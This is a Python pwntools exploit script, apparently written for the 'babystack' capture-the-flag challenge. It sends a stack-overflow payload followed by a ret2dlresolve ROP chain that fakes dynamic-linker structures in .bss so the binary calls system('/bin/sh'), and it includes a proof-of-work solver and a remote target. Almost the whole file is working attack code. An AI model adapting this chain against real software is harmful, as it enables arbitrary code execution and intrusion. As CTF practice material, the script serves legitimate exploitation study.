#!/usr/bin/python
import sys, string
sys.path.append("/home/cpegg/roputils")
from pwn import *
from roputils import *
import itertools
from hashlib import sha256

LOCAL = True
LOCALIP = "172.0.0.1"
HOST = "202.120.7.202"
PORT = 6666
addr_bss = 0x0804a100
charset = string.letters+string.digits
rop = ROP("./babystack")
r = process("./babystack")


# jmprel = r.dynamic('JMPREL')
# relent = r.dynamic('RELENT')
# symtab = r.dynamic('SYMTAB')
# syment = self.dynamic('SYMENT')
# strtab = self.dynamic('STRTAB')
# log.info("STRTAB: " + hex(STRTAB))
# log.info("SYMTAB: " + hex(SYMTAB))
# log.info("JMPREL: " + hex(JMPREL))
gdb.attach(r,'b *0x8048451\nc')

def calcpow(chal):
    for combo in itertools.combinations_with_replacement(string.letters+string.digits,4):
        sol = ''.join(combo)        
        if sha256(chal + sol).digest().startswith("\0\0\0"):
            return sol

    return None

def get_connection():
    return remote("localhost", 6666) if LOCAL else remote(HOST, PORT)

def exploit(r):
    log.info("Solve pow ")

    sol = None
    if not LOCAL:
        while sol == None:
            r = get_connection()

            sol = calcpow(r.recvline().strip())

            if sol == None:
                r.close()            

        r.send(sol)

    log.info("Stage1: Prepare bigger read for ropchain")

    payload = "A"*40
    payload += p32(0x804a500)
    payload += p32(0x8048446)
    payload += p32(80)                 # exact length of stage 2 payload
    payload += "B"*(64-len(payload))

    log.info("Stage2: Send ret2dlresolve executing reverse shell")

    payload += "A"*40
    payload += p32(0x804a500)

	# Read the fake tabs from payload2 to bss
    payload += rop.call("read", 0, addr_bss, 150)

	# Call dl_resolve with offset to our fake symbol
    payload += rop.dl_resolve_call(addr_bss+60, addr_bss)

	# Create fake rel and sym on bss
    payload2 = rop.string("/bin/sh")
    payload2 += rop.fill(60, payload2)                        # Align symbol to bss+60
    payload2 += rop.dl_resolve_data(addr_bss+60, "system")    # Fake r_info / st_name
    print (repr(rop.dl_resolve_data(addr_bss+60, "system")))
    payload2 += rop.fill(150, payload2)
	    
    payload += payload2

    payload = payload.ljust(0x100, "\x00")

    r.sendline(payload)

    r.interactive()
    
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False        
        exploit(r)
    else:
        LOCAL = True                        
        exploit(r)